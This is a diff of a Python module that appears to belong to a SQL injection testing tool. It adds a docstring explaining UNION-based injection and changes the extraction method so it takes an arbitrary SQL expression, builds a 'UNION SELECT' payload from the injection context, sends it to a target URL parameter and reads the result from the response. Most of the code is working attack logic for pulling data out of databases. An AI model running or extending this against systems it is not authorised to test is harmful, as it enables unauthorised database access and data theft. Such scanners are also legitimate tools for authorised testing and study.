@@ -1,11 +1,25 @@
 from core.Requester import HttpResponse, Requester
 from core.Analyzer import Analyzer
-from utils.constants import InjectionContext, differ_length_col_count, diff_marker
+from utils.constants import InjectionContext, DIFFER_LENGTH_COL_COUNT, DIFF_MARKER
 from utils.Logger import Logger
 
 
 class UnionInjector:
 	"""
+	A UNION query combines the results of two SELECT statements.
+ 
+ 	For example, if the application does:
+ 
+ 		SELECT first_name, last_name
+		FROM users
+		WHERE id = <input>;
+ 
+	UNION SQLi appends another SELECT to return additional rows or values.
+ 
+ 
+	Notes:
+	-----
+ 
 	`'`: closes the string
 	Ex.: SELECT * FROM users WHERE id = '$id';
 		=> SELECT * FROM users WHERE id = '' UNION SELECT...;
@@ -57,7 +71,7 @@ class UnionInjector:
 					and not self.analyzer.responses_differ(
 						baseline,
 						response,
-						differ_length_col_count,
+						DIFFER_LENGTH_COL_COUNT,
 				)
     		):
 				# Logger.debug(response.body)
@@ -73,7 +87,7 @@ class UnionInjector:
   		"""
 
 		# Create a marker list matching the number of columns to make query compatible.
-		nulls = ",".join([diff_marker] * (column_count))
+		nulls = ",".join([DIFF_MARKER] * (column_count))
 
 		payload = (
 			f"{ctx.prefix}UNION SELECT {nulls}{ctx.suffix}"
@@ -86,12 +100,12 @@ class UnionInjector:
 		)
 
 		# Logger.debug(response.body)
-		if diff_marker not in response.body:
+		if DIFF_MARKER not in response.body:
 			return False
 		return True
 
-	def test_db_name(
-     	self, url: str, param: str, ctx: InjectionContext, column_count: int
+	def test_expressions_name(
+     	self, url: str, param: str, ctx: InjectionContext, expression: str, column_count: int
     ) -> str | None:
 		"""
 		Test UNION injection to check if we can retrieve the database name
@@ -105,16 +119,17 @@ class UnionInjector:
 		Now that we know the injection works we will get the real table names
   		"""
   
-		# Create a NULL list matching the number of columns to make query compatible.
-		# We substract 1 from count because the main element is added afterwards 
-		nulls = ",".join(["NULL"] * (column_count - 1))
-		payload = f"{ctx.prefix}UNION SELECT database(),{nulls}{ctx.suffix}"
+		# Add SELECT keyword if not included in the expression
+		expression = expression if expression.find("SELECT") != -1 else "SELECT " + expression
+		Logger.debug(f"expprrrrr: {expression}")
+		payload = f"{ctx.prefix}UNION {expression}{ctx.suffix}"
 
 		response = self.requester.send(
 			url,
 			{param: payload}
 		)
-
+  
+		# Logger.debug(response.body)
 		return self._extract_text(response.body)
 
 
